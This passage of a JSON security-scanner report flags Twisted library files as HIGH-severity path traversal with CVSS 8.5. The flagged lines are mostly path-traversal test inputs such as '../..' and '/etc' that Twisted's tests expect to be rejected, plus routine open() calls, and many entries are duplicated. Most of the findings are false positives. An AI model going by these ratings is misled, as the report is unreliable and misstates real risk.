            "context": "            (\"/a/b/../../c\", [\"c\"]),\n            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),\n            (\"/a/b/../../c/../\", []),\n        ]:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3195,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c/../\", []),",
            "context": "            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),\n            (\"/a/b/../../c/../\", []),\n        ]:\n            self.assertEqual(ftp.toSegments([\"x\"], inp), outp)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3195,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c/../\", []),",
            "context": "            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),\n            (\"/a/b/../../c/../\", []),\n        ]:\n            self.assertEqual(ftp.toSegments([\"x\"], inp), outp)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3195,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c/../\", []),",
            "context": "            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),\n            (\"/a/b/../../c/../\", []),\n        ]:\n            self.assertEqual(ftp.toSegments([\"x\"], inp), outp)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3195,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c/../\", []),",
            "context": "            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),\n            (\"/a/b/../../c/../\", []),\n        ]:\n            self.assertEqual(ftp.toSegments([\"x\"], inp), outp)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3195,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c/../\", []),",
            "context": "            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),\n            (\"/a/b/../../c/../\", []),\n        ]:\n            self.assertEqual(ftp.toSegments([\"x\"], inp), outp)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3195,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c/../\", []),",
            "context": "            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),\n            (\"/a/b/../../c/../\", []),\n        ]:\n            self.assertEqual(ftp.toSegments([\"x\"], inp), outp)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3201,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../\",",
            "context": "        for inp in [\n            \"..\",\n            \"../\",\n            \"a/../..\",\n            \"a/../../\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3201,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../\",",
            "context": "        for inp in [\n            \"..\",\n            \"../\",\n            \"a/../..\",\n            \"a/../../\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3202,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"a/../..\",",
            "context": "            \"..\",\n            \"../\",\n            \"a/../..\",\n            \"a/../../\",\n            \"/..\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3202,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"a/../..\",",
            "context": "            \"..\",\n            \"../\",\n            \"a/../..\",\n            \"a/../../\",\n            \"/..\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3203,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"a/../../\",",
            "context": "            \"../\",\n            \"a/../..\",\n            \"a/../../\",\n            \"/..\",\n            \"/../\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3203,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"a/../../\",",
            "context": "            \"../\",\n            \"a/../..\",\n            \"a/../../\",\n            \"/..\",\n            \"/../\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3203,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"a/../../\",",
            "context": "            \"../\",\n            \"a/../..\",\n            \"a/../../\",\n            \"/..\",\n            \"/../\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3203,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"a/../../\",",
            "context": "            \"../\",\n            \"a/../..\",\n            \"a/../../\",\n            \"/..\",\n            \"/../\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3205,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/../\",",
            "context": "            \"a/../../\",\n            \"/..\",\n            \"/../\",\n            \"/a/../..\",\n            \"/a/../../\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3205,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/../\",",
            "context": "            \"a/../../\",\n            \"/..\",\n            \"/../\",\n            \"/a/../..\",\n            \"/a/../../\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3206,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/a/../..\",",
            "context": "            \"/..\",\n            \"/../\",\n            \"/a/../..\",\n            \"/a/../../\",\n            \"/a/b/../../..\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3206,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/a/../..\",",
            "context": "            \"/..\",\n            \"/../\",\n            \"/a/../..\",\n            \"/a/../../\",\n            \"/a/b/../../..\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3207,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/a/../../\",",
            "context": "            \"/../\",\n            \"/a/../..\",\n            \"/a/../../\",\n            \"/a/b/../../..\",\n        ]:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3207,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/a/../../\",",
            "context": "            \"/../\",\n            \"/a/../..\",\n            \"/a/../../\",\n            \"/a/b/../../..\",\n        ]:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3207,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/a/../../\",",
            "context": "            \"/../\",\n            \"/a/../..\",\n            \"/a/../../\",\n            \"/a/b/../../..\",\n        ]:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3207,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/a/../../\",",
            "context": "            \"/../\",\n            \"/a/../..\",\n            \"/a/../../\",\n            \"/a/b/../../..\",\n        ]:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3208,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/a/b/../../..\",",
            "context": "            \"/a/../..\",\n            \"/a/../../\",\n            \"/a/b/../../..\",\n        ]:\n            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [], inp)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3208,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/a/b/../../..\",",
            "context": "            \"/a/../..\",\n            \"/a/../../\",\n            \"/a/b/../../..\",\n        ]:\n            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [], inp)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3208,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/a/b/../../..\",",
            "context": "            \"/a/../..\",\n            \"/a/../../\",\n            \"/a/b/../../..\",\n        ]:\n            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [], inp)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3208,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/a/b/../../..\",",
            "context": "            \"/a/../..\",\n            \"/a/../../\",\n            \"/a/b/../../..\",\n        ]:\n            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [], inp)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3212,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "for inp in [\"../..\", \"../../\", \"../a/../..\"]:",
            "context": "            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [], inp)\n\n        for inp in [\"../..\", \"../../\", \"../a/../..\"]:\n            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [\"x\"], inp)\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3212,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "for inp in [\"../..\", \"../../\", \"../a/../..\"]:",
            "context": "            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [], inp)\n\n        for inp in [\"../..\", \"../../\", \"../a/../..\"]:\n            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [\"x\"], inp)\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3212,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "for inp in [\"../..\", \"../../\", \"../a/../..\"]:",
            "context": "            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [], inp)\n\n        for inp in [\"../..\", \"../../\", \"../a/../..\"]:\n            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [\"x\"], inp)\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3212,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "for inp in [\"../..\", \"../../\", \"../a/../..\"]:",
            "context": "            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [], inp)\n\n        for inp in [\"../..\", \"../../\", \"../a/../..\"]:\n            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [\"x\"], inp)\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3212,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "for inp in [\"../..\", \"../../\", \"../a/../..\"]:",
            "context": "            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [], inp)\n\n        for inp in [\"../..\", \"../../\", \"../a/../..\"]:\n            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [\"x\"], inp)\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3212,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "for inp in [\"../..\", \"../../\", \"../a/../..\"]:",
            "context": "            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [], inp)\n\n        for inp in [\"../..\", \"../../\", \"../a/../..\"]:\n            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [\"x\"], inp)\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3212,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "for inp in [\"../..\", \"../../\", \"../a/../..\"]:",
            "context": "            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [], inp)\n\n        for inp in [\"../..\", \"../../\", \"../a/../..\"]:\n            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [\"x\"], inp)\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3212,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "for inp in [\"../..\", \"../../\", \"../a/../..\"]:",
            "context": "            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [], inp)\n\n        for inp in [\"../..\", \"../../\", \"../a/../..\"]:\n            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [\"x\"], inp)\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3212,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "for inp in [\"../..\", \"../../\", \"../a/../..\"]:",
            "context": "            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [], inp)\n\n        for inp in [\"../..\", \"../../\", \"../a/../..\"]:\n            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [\"x\"], inp)\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3212,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "for inp in [\"../..\", \"../../\", \"../a/../..\"]:",
            "context": "            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [], inp)\n\n        for inp in [\"../..\", \"../../\", \"../a/../..\"]:\n            self.assertRaises(ftp.InvalidPath, ftp.toSegments, [\"x\"], inp)\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_paths.py",
            "line": 851,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "self.assertRaises(filepath.InsecurePath, self.path.child, b\"../..\")",
            "context": "        self.assertRaises(filepath.InsecurePath, self.path.child, b\"..\")\n        self.assertRaises(filepath.InsecurePath, self.path.child, b\"/etc\")\n        self.assertRaises(filepath.InsecurePath, self.path.child, b\"../..\")\n\n    @skipIf(platform.getType() != \"win32\", \"Test will run only on Windows.\")",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_paths.py",
            "line": 851,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "self.assertRaises(filepath.InsecurePath, self.path.child, b\"../..\")",
            "context": "        self.assertRaises(filepath.InsecurePath, self.path.child, b\"..\")\n        self.assertRaises(filepath.InsecurePath, self.path.child, b\"/etc\")\n        self.assertRaises(filepath.InsecurePath, self.path.child, b\"../..\")\n\n    @skipIf(platform.getType() != \"win32\", \"Test will run only on Windows.\")",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_paths.py",
            "line": 1246,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with appender.open(\"r+\") as f:",
            "context": "\n        # read/write should let us do both without erasing those bytes\n        with appender.open(\"r+\") as f:\n            self.assertEqual(f.read(), b\"abcdef\")\n            # ANSI C *requires* an fseek or an fgetpos between an fread and an",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_paths.py",
            "line": 1264,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with appender.open(\"w+\") as f:",
            "context": "        # write/read should let us do both, but erase anything that's there\n        # already.\n        with appender.open(\"w+\") as f:\n            self.assertEqual(f.read(), b\"\")\n            f.seek(0, 1)  # Don't forget this!",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_paths.py",
            "line": 1271,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with appender.open(\"a+\") as f:",
            "context": "        # super append mode should let us read and write and also position the\n        # cursor at the end of the file, without erasing everything.\n        with appender.open(\"a+\") as f:\n            # The order of these lines may seem surprising, but it is\n            # necessary. The cursor is not at the end of the file until after",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/process_tty.py",
            "line": 3,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(\"/dev/tty\", \"rb+\", buffering=0) as f:",
            "context": "\"\"\"Test to make sure we can open /dev/tty\"\"\"\n\nwith open(\"/dev/tty\", \"rb+\", buffering=0) as f:\n    a = f.readline()\n    f.write(a)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/util.py",
            "line": 348,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.stdin = sys.stdout = open(\"/dev/tty\", \"r+\")",
            "context": "                try:\n                    old = sys.stdin, sys.stdout\n                    sys.stdin = sys.stdout = open(\"/dev/tty\", \"r+\")\n                except BaseException:\n                    raise RuntimeError(\"Cannot obtain a TTY\")",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/filepath.py",
            "line": 1068,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "return open(self.path, mode.replace(\"b\", \"\") + \"b\")",
            "context": "            return self.create()\n        # Make sure we open with exactly one \"b\" in the mode.\n        return open(self.path, mode.replace(\"b\", \"\") + \"b\")\n\n    # stat methods below",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/filepath.py",
            "line": 1618,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "return cast(IO[bytes], os.fdopen(fdint, \"w+b\"))",
            "context": "        # one returned from 'open' by default.  send a patch to Python...\n\n        return cast(IO[bytes], os.fdopen(fdint, \"w+b\"))\n\n    @overload",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/logfile.py",
            "line": 73,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "self._file = cast(BinaryIO, open(self.path, \"rb+\", 0))",
            "context": "        self.closed = False\n        if os.path.exists(self.path):\n            self._file = cast(BinaryIO, open(self.path, \"rb+\", 0))\n            self._file.seek(0, 2)\n        else:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/logfile.py",
            "line": 80,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "self._file = cast(BinaryIO, open(self.path, \"wb+\", 0))",
            "context": "                oldUmask = os.umask(0o777)\n                try:\n                    self._file = cast(BinaryIO, open(self.path, \"wb+\", 0))\n                finally:\n                    os.umask(oldUmask)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/logfile.py",
            "line": 84,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "self._file = cast(BinaryIO, open(self.path, \"wb+\", 0))",
            "context": "                    os.umask(oldUmask)\n            else:\n                self._file = cast(BinaryIO, open(self.path, \"wb+\", 0))\n        if self.defaultMode is not None:\n            try:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/_release.py",
            "line": 233,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(filename + \".bak\") as f:",
            "context": "    \"\"\"\n    os.rename(filename, filename + \".bak\")\n    with open(filename + \".bak\") as f:\n        d = f.read()\n    for k, v in oldToNew.items():",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/_release.py",
            "line": 237,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(filename + \".new\", \"w\") as f:",
            "context": "    for k, v in oldToNew.items():\n        d = d.replace(k, v)\n    with open(filename + \".new\", \"w\") as f:\n        f.write(d)\n    os.rename(filename + \".new\", filename)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/_release.py",
            "line": 256,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "L{twisted.python.filepath.FilePath} /foo/baz will be C{../baz},",
            "context": "    It is assumed that both paths represent directories, not files. That is to\n    say, the delta of L{twisted.python.filepath.FilePath} /foo/bar to\n    L{twisted.python.filepath.FilePath} /foo/baz will be C{../baz},\n    not C{baz}.\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/_release.py",
            "line": 256,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "L{twisted.python.filepath.FilePath} /foo/baz will be C{../baz},",
            "context": "    It is assumed that both paths represent directories, not files. That is to\n    say, the delta of L{twisted.python.filepath.FilePath} /foo/bar to\n    L{twisted.python.filepath.FilePath} /foo/baz will be C{../baz},\n    not C{baz}.\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/scripts/htmlizer.py",
            "line": 64,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(filename + \".html\", \"wb\") as output:",
            "context": "        stylesheet = \"\"\n\n    with open(filename + \".html\", \"wb\") as output:\n        outHeader = header % {\n            \"title\": filename,",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/web/server.py",
            "line": 138,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "return (len(self.postpath) * b\"../\") + name",
            "context": "        \"\"\"\n        if self.postpath:\n            return (len(self.postpath) * b\"../\") + name\n        else:\n            return name",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/web/server.py",
            "line": 138,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "return (len(self.postpath) * b\"../\") + name",
            "context": "        \"\"\"\n        if self.postpath:\n            return (len(self.postpath) * b\"../\") + name\n        else:\n            return name",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/web/server.py",
            "line": 154,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "return ((lpp - 1) * b\"../\") + name",
            "context": "        lpp = len(self.postpath)\n        if lpp > 1:\n            return ((lpp - 1) * b\"../\") + name\n        elif lpp == 1:\n            return name",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/web/server.py",
            "line": 154,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "return ((lpp - 1) * b\"../\") + name",
            "context": "        lpp = len(self.postpath)\n        if lpp > 1:\n            return ((lpp - 1) * b\"../\") + name\n        elif lpp == 1:\n            return name",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/recvline.py",
            "line": 38,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "self._logFile = open(key + \"-\" + str(count), \"w\")",
            "context": "        count = _counters.get(key, 0)\n        _counters[key] = count + 1\n        self._logFile = open(key + \"-\" + str(count), \"w\")\n\n    def __str__(self) -> str:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/endpoints.py",
            "line": 756,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "return self.tty.open(\"r+\")",
            "context": "        \"\"\"\n        try:\n            return self.tty.open(\"r+\")\n        except BaseException:\n            # Give back a file-like object from which can be read a byte string",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/relay.py",
            "line": 85,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(message + \"-H\", \"rb\") as fp:",
            "context": "        self.names = []\n        for message in messagePaths:\n            with open(message + \"-H\", \"rb\") as fp:\n                messageContents = pickle.load(fp)\n            fp = open(message + \"-D\")",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/relay.py",
            "line": 87,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "fp = open(message + \"-D\")",
            "context": "            with open(message + \"-H\", \"rb\") as fp:\n                messageContents = pickle.load(fp)\n            fp = open(message + \"-D\")\n            messageContents.append(fp)\n            self.messages.append(messageContents)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/relaymanager.py",
            "line": 459,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "return open(os.path.join(self.directory, message + \"-H\"), \"rb\")",
            "context": "        @return: The envelope file for the message.\n        \"\"\"\n        return open(os.path.join(self.directory, message + \"-H\"), \"rb\")\n\n    def createNewMessage(self):",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/relaymanager.py",
            "line": 471,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "headerFile = open(os.path.join(self.directory, fname + \"-H\"), \"wb\")",
            "context": "        fname = f\"{os.getpid()}_{time.time()}_{self.n}_{id(self)}\"\n        self.n = self.n + 1\n        headerFile = open(os.path.join(self.directory, fname + \"-H\"), \"wb\")\n        tempFilename = os.path.join(self.directory, fname + \"-C\")\n        finalFilename = os.path.join(self.directory, fname + \"-D\")",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/relaymanager.py",
            "line": 574,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "open(self.manager.queue.getPath(message) + \"-D\"), from_, to",
            "context": "            from_, to = pickle.load(fp)\n        from_, to, bounceMessage = bounce.generateBounce(\n            open(self.manager.queue.getPath(message) + \"-D\"), from_, to\n        )\n        fp, outgoingMessage = self.manager.queue.createNewMessage()",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_zipstream.py",
            "line": 185,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(fn, \"r+b\") as scribble:",
            "context": "            zeroOffset = zf.getinfo(\"0\").header_offset\n        # Zero out just the one header.\n        with open(fn, \"r+b\") as scribble:\n            scribble.seek(zeroOffset, 0)\n            scribble.write(b\"0\" * 4)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_zipstream.py",
            "line": 202,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(fn, \"r+b\") as scribble:",
            "context": "            info = zf.getinfo(\"0\")\n            info.filename = \"not zero\"\n        with open(fn, \"r+b\") as scribble:\n            scribble.seek(info.header_offset, 0)\n            scribble.write(info.FileHeader())",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 41,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../\", \"http://a/b/\"),",
            "context": "    (\"./\", \"http://a/b/c/\"),\n    (\"..\", \"http://a/b/\"),\n    (\"../\", \"http://a/b/\"),\n    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 41,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../\", \"http://a/b/\"),",
            "context": "    (\"./\", \"http://a/b/c/\"),\n    (\"..\", \"http://a/b/\"),\n    (\"../\", \"http://a/b/\"),\n    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 42,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../g\", \"http://a/b/g\"),",
            "context": "    (\"..\", \"http://a/b/\"),\n    (\"../\", \"http://a/b/\"),\n    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),",
            "cvss_score": 8.5
          },
          {
